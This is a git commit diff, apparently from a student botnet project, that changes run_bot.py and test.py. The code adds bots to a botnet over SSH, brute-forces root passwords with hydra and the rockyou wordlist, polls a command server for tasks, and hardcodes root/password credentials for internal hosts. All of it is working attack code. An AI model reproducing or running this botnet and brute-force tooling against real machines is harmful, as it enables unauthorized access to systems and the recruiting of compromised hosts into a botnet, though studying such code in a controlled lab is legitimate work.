5f65668050b5c5883fccc6084f2c410e2b9335ca
Ding Zhang <dzhang55@illinois.edu>
2019-02-24 12:08:23 +0000

    fixed hack

--- run_bot.py
+++ run_bot.py
@@ -1,29 +1,33 @@
 import settings
+import botnet
+import asyncio
 
 class BotRunTime:
     def __init__(self, loop, server):
         self.loop = loop
         self.server = server
-        loop.create_task(self.infect())
-        loop.create_task(self.get_and_schedule_job())
-        self.run()
+        #loop.create_task(self.infect())
+        #loop.create_task(self.get_and_schedule_job())
+        self.infect()
 #host ip:10.142.0.2  
 #host username:root
 #host password:password
-    async def infect(self):
-        while True:
+    def infect(self):
+        j=0
+        while j<1:
             print('infect')
-            botnet.add_bot('10.142.0.2','root','password')
+            botnet.add_bot('10.142.0.3','root','password')
             target = botnet.targets()
             botnet.hydra(target)
-            print(i.host for i in botnet)
-            await asyncio.sleep(settings.INFECTION_CYCLE_TIME)
+            #print(i.host for i in botnet.botnet)
+            j=j+1
+       #     await asyncio.sleep(settings.INFECTION_CYCLE_TIME)
 
-    async def get_and_schedule_job(self):
+    def get_and_schedule_job(self):
         while True:
             signed_task_description = self.server.get('task')
-            print(signed_task_description)
-            await asyncio.sleep(settings.GET_JOB_CYCLE_TIME)
+           # print(signed_task_description)
+    #        await asyncio.sleep(settings.GET_JOB_CYCLE_TIME)
 
     def run(self):
         try:
@@ -33,3 +37,4 @@ class BotRunTime:
         finally:
             self.server.stop()
             self.loop.close()
+runtime = BotRunTime(asyncio.get_event_loop(),"10.142.0.2")
--- test.py
+++ test.py
@@ -2,8 +2,10 @@ from pexpect import pxssh
 import subprocess
 import numpy as np
 import get_lan_ip
-
-output = subprocess.Popen(["hydra -l root -P rockyou.txt -t 4 10.142.0.3"], stdout = subprocess.PIPE)
-response = output.communicate()
+import re
+output = subprocess.Popen(['hydra', '-l', 'root', '-P', 'rockyou.txt', '-t', '4', '10.142.0.3','ssh'], stdout = subprocess.PIPE)
+response = output.communicate()[0]
 password = response.split("password: ", 1)[1]
-print("password is", password)
+passwd = password.split("\n",1)[0]
+print("password is "+passwd)
+
